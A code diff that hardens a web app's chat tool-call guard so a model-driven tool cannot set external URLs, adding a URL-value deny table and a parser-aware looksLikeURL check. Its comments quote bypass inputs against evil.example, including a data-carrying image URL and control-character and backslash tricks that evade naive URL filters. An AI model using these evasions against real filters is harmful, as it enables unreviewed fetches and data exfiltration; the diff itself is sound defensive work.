@@ -105,6 +105,35 @@ export const CHAT_DENIED_URL_PARAMS = {
     importMedia: ['file', 'filename', 'url'],
 };
 
+// Generic setters, whose target control is picked by name when the call runs, so the table
+// above cannot know whether a value lands in a URL field. One does: an overlay's Image URL is
+// a plain string control that fetches on change, so setMenuValue({path: 'imageURL', value:
+// 'https://evil.example/?d=...'}) would walk round CHAT_DENIED_URL_PARAMS. No URL of any
+// kind is accepted here, matching WebMCP's own menu setter (validateMenuValue).
+export const CHAT_DENIED_URL_VALUES = {
+    setMenuValue: ['value'],
+};
+
+// True for anything carrying a scheme or a protocol-relative prefix. A free-text control that
+// holds a texture or feed URL would otherwise become an unreviewed fetch primitive, persisted
+// on the node and refetched after a save. Used by CHAT_DENIED_URL_VALUES above and by WebMCP.
+//
+// Test the string the *URL parser* will see, not the one that was typed. WHATWG URL strips
+// leading and trailing C0 controls and spaces, discards tab, CR and LF from anywhere in the
+// input, and treats a backslash as a slash in a special scheme. A leading NUL, an embedded
+// tab, and "/\evil/x" therefore all resolve to a remote origin while matching none of them
+// as typed. Apply the same three rules before testing. Verified against new URL() rather
+// than reasoned from the spec.
+export function looksLikeURL(value) {
+    const normalized = value
+        // eslint-disable-next-line no-control-regex
+        .replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g, "")
+        // eslint-disable-next-line no-control-regex
+        .replace(/[\u0009\u000A\u000D]/g, "")
+        .replace(/\\/g, "/");
+    return /^[a-z][a-z0-9+.-]*:/i.test(normalized) || normalized.startsWith("//");
+}
+
 // Mirrors CSitrecAPI._normalizeMediaSource. The guard has to test the string that will
 // actually be fetched: "!https://evil.example/x" resolves as a same-origin *relative path*
 // (a leading "!" is not a URL scheme), so an un-normalized check calls it safe — and then
@@ -146,9 +175,8 @@ function valueAtPath(args, dottedPath) {
 
 // Returns a refusal result to hand straight back to the caller, or null to allow.
 export function refuseExternalURLParams(call, source = 'chat') {
-    const denied = CHAT_DENIED_URL_PARAMS[call?.fn];
-    if (!denied || !call.args) return null;
-    for (const param of denied) {
+    if (!call?.args) return null;
+    for (const param of CHAT_DENIED_URL_PARAMS[call.fn] ?? []) {
         const value = valueAtPath(call.args, param);
         if (value === undefined || value === null) continue;
         // Fail CLOSED on anything that is not a plain string. An array or object reaching a
@@ -163,6 +191,21 @@ export function refuseExternalURLParams(call, source = 'chat') {
                 fn: call.fn,
                 error: `'${param}' cannot be set to an external URL from a model-driven tool. `
                     + `Tell the user to set it via the UI instead.`,
+            };
+        }
+    }
+    for (const param of CHAT_DENIED_URL_VALUES[call.fn] ?? []) {
+        const value = valueAtPath(call.args, param);
+        if (value === undefined || value === null) continue;
+        // A boolean or number cannot carry a URL; any other non-string fails closed, as above.
+        if (typeof value === 'boolean' || typeof value === 'number') continue;
+        if (typeof value !== 'string' || looksLikeURL(value)) {
+            console.warn(`Refusing ${source}-sourced URL for ${call.fn}.${param}:`, value);
+            return {
+                success: false,
+                fn: call.fn,
+                error: `'${param}' cannot be a URL from a model-driven tool. `
+                    + `Tell the user to set URL-valued controls via the UI instead.`,
             };
         }
     }
